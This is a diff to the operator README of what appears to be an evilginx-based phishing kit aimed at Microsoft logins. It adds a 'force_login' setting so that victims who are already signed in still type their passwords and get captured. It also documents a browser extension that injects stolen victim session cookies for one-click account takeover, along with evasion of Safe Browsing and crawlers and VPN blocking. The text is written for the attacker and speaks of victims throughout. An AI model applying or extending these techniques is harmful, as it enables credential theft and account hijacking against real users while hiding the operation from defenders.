@@ -256,6 +256,8 @@ exit
 
 **Note:** `unauth_redirect on` answers every unauthorized/blocked request with an HTTP `302` to `unauth_url` (instead of serving a fetched copy of the page). Crawlers and Google Safe Browsing therefore always land on the genuine `login.microsoftonline.com`, which is the strongest possible "clean redirector" signal. Set it `off` to fall back to serving a rewritten copy of the page.
 
+**Note:** `force_login on` (default) makes the provider show its credential form even when the visitor's browser already holds a valid session. Without it, an already-signed-in victim gets silently signed back in and never types a password, so the capture is empty. It appends `prompt=login` to OAuth `authorize` hops and `wfresh=0` to SAML/WS-Fed hops, leaving an app's own `prompt=` value alone. Toggle it in the control panel under **Manage → Settings**, or `config force_login on|off`.
+
 ---
 
 # PART 8: TELEGRAM INTEGRATION
@@ -558,6 +560,8 @@ curl -u admin:PASS -X POST -H 'Content-Type: application/json' \
 
 The `extension/` folder in the repo is a Manifest V3 Chromium extension that automates session takeover — no Cookie-Editor needed. It injects cookies directly via the browser's native API, which works for HttpOnly cookies that JavaScript cannot touch.
 
+**It does not touch the profile you are already signed into.** By default the victim's cookies are written into an *isolated* (incognito) store and the target opens there — a separate cookie jar, so nothing you are logged into gets overwritten and closing the window throws the victim session away. Everything about it is disposable.
+
 ## Install (one-time, on the machine you use to access the dashboard)
 
 Pull the latest repo on that machine, then:
@@ -574,39 +578,50 @@ Pull the latest repo on that machine, then:
 > ```
 > Then load it from the local copy.
 
+> **Leave "Allow in incognito" alone.** The manifest declares `"incognito": "spanning"`, so the extension is available in incognito automatically — that is what makes the isolated window possible. If incognito is blocked by policy the extension falls back to a normal window and says so in the popup.
+
 ## Using it
 
 1. Open the dashboard and click any session row that shows a token indicator
-2. The **"● Injector"** green badge appears next to the Inject Session button — this confirms the extension is detected
-3. Click **Inject Session**
-4. Cookies are injected into your browser and the real target site opens in a new tab, already authenticated
+2. Click **Take over**
+3. The cookies go into the isolated window and the real target site opens there, already authenticated
+4. The pinned first tab in that window names the victim so you can tell windows apart
 
-The modal shows how many cookies were injected and flags any that failed. If any failed, the session may still work — not all cookies are required for authentication.
+Only **one victim is live in the isolated window at a time** — that is a property of incognito, which has a single jar. Taking over a second victim replaces the first cleanly: every cookie on the relevant domains is cleared before the new ones are written, so nothing is merged or left stale. Your normal profile is never involved.
 
-## Extension popup
+Need two victims at once, side by side? Use **"Use this profile instead"**, or run a second Chrome with its own profile: `chrome --user-data-dir=/tmp/chrome-victim2`.
 
-Click the ⚡ Session Injector icon in your Chrome toolbar to open the popup at any time. It shows:
+The modal reports how many cookies went in, how many were cleared first, and flags any that failed. A failed cookie does not always matter — not every cookie is needed for authentication.
 
-- **Connection status** — green dot when the dashboard is open in a tab
-- **Selected session** — the session you most recently clicked (phishlet, ID, token status)
-- **Last inject result** — cookie count, target URL, and time of the last injection
+## Extension popup and settings
 
-The popup updates live while it is open. Use **Open Dashboard** to jump straight to the dashboard tab.
+Click the Session Injector icon in the toolbar. It shows:
 
-After a successful inject the toolbar icon briefly shows a green badge with the number of cookies that were set.
+- **Status** — whether a dashboard tab is open, and whether the isolated window exists (with a *Focus* button)
+- **Selected session** — the row you clicked, with one-click *Isolated* / *Here*
+- **Live in the isolated window** — which victim is currently loaded, with *Focus window* and *Clear*
+- **Recent sessions** — replay any of the last 8 without going back to the dashboard
+- **Behaviour** — `Auto-open new captures` and the default target
+
+Right-click the icon → **Options** (or the *Settings* link) for the wider view: full recent list, plus the dashboard URL and login. With those set, the popup can take over any session even when no dashboard tab is open.
 
 ## What it does vs. Cookie-Editor
 
 | | Session Injector extension | Cookie-Editor (manual) |
 |--|---------------------------|------------------------|
-| HttpOnly cookies | ✅ Injected automatically | ✅ Also works |
+| HttpOnly cookies | Injected automatically | Also works |
 | Steps required | 1 click | Download → open tab → import → reload |
 | Target URL | Opens automatically | You click "Open Target Site" |
-| Setup | Load unpacked once | Install from Chrome Web Store |
+| Disturbs your own logins | No (isolated window) | Yes (same jar) |
+| Switch victim | One click, stale cookies cleared | Manual delete first |
 
 ## Updating the extension after a repo pull
 
 The extension code is in `extension/` — if it changes after a pull, go to `chrome://extensions`, find **Session Injector**, and click the **refresh icon** on its card.
+
+## Testing the extension without a browser
+
+`node extension/test.js` runs the background worker against mocked Chrome APIs and asserts the profile isolation guarantees: the isolated store is written and the default store is not, `sameSite=none` is upgraded to `secure`, `__Host-` cookies drop their domain, switching victims clears the previous domains, and closing the window forgets the session.
 
 ---
 
@@ -968,6 +983,7 @@ Restart evilginx after editing `blacklist.txt` — the file is loaded at startup
 | `config unauth_url <url>` | Redirect unauthorized visitors here |
 | `config unauth_redirect on/off` | `on`: answer unauthorized/blocked traffic with a 302 to `unauth_url` (Safe-Browsing friendly); `off`: serve a rendered copy |
 | `config strip_headers on/off` | Remove Evilginx fingerprints from responses |
+| `config force_login on/off` | `on`: always show the provider's login form (`prompt=login`), even if the visitor is already signed in |
 | `config blockvpn on/off` | Block visitors detected as VPN/proxy/datacenter (requires GeoIP) |
 | `config turnstile <sitekey:secretkey>` | Enable Cloudflare Turnstile CAPTCHA (use `off` to disable) |
 | `config teletoken <token>` | Telegram bot token |
